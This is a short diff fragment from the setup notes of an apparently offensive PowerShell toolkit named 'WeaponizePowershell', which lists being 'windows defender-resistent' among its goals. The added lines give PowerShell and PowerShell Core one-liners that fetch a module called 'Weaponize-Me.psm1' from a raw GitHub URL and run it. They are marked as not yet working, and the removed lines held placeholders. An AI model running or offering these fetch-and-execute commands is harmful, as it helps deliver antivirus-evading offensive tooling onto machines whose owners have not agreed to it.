@@ -7,13 +7,8 @@
 # 4. Should be 'windows defender-resistent
 
 # -------------------------------------Execution------------------------------------------------
-# execute this from a windows box using: 
-  Powershell 3+ one liner execute:    powershell.exe -command wget BLAH+TODO
-  Powershell Core one liner execute:  pwsh.exe -command wget BLAH+TODO
+  (not yet working)
+  Powershell 3+ one liner execute:    powershell.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
+  Powershell Core one liner execute:  pwsh.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
   
-# execute this from a *nix box using: 
-  powershellCore one liner execute:   pwsh wget BLAH+TODO
-
-
-
 
